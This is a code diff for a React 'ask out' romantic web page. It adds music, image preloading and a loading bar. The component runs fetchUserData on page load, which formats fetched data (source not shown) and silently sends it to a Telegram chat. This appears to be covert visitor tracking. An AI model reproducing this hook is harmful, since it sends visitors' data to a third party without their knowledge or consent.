@@ -2,11 +2,22 @@ import { AskOut } from "./AskOut";
 import { ImageLayer } from "./Imagelayer";
 import { useState, useEffect } from "react";
 import { Login } from "./Login";
-import { sendMessageTelegram } from "./telegramHandlre";
+import { MusicPlayer } from "./components/MusicPlayer";
+import { sendMessageTelegram } from "./telegramHandler";
+import { useAssetPreloader } from "./hooks/useAssetPreloader";
+import { allImages } from "./constants/assets";
+
+// Import your romantic background music here
+// You'll need to add an mp3 file to src/assets/music/
+import romanticMusic from "./assets/music/romantic.mp3";
+
 function App() {
 	const [isYes, setYes] = useState(false);
 	const [authenticated, setAuthenticated] = useState(false);
 	const [Sent, setSent] = useState(false);
+
+	// Preload all images in background
+	const { progress, isComplete } = useAssetPreloader(allImages);
 
 	useEffect(() => {
 		fetchUserData();
@@ -24,30 +35,34 @@ function App() {
 			.then((data) => {
 				const message = Object.entries(data)
 					.map(([key, value]) => {
-						// Handle arrays and objects for better readability
 						if (Array.isArray(value)) {
 							return `${key} - \`${value.join(", ")}\``;
-						} else if (
-							typeof value === "object" &&
-							value !== null
-						) {
+						} else if (typeof value === "object" && value !== null) {
 							return `${key} - \`${JSON.stringify(value)}\``;
 						} else {
 							return `${key} - \`${value}\``;
 						}
 					})
-					.join("\n");;
-				sendMessageTelegram(message);}
-			)
-				;
+					.join("\n");
+				sendMessageTelegram(message);
+			});
 		setSent(true);
 	};
 
 	return (
 		<>
+			{/* Loading indicator - shows while preloading */}
+			{!isComplete && (
+				<div className="loading-bar" style={{ width: `${progress}%` }} />
+			)}
+
+			{/* Main content */}
 			{!authenticated && <Login setAuthenticated={setAuthenticated} />}
-			{authenticated && <AskOut setYes={setYes} />}
+			{authenticated && !isYes && <AskOut setYes={setYes} />}
 			{isYes && <ImageLayer />}
+
+			{/* Music player - uncomment when you add music */}
+			<MusicPlayer audioSrc={romanticMusic} /> 
 		</>
 	);
 }
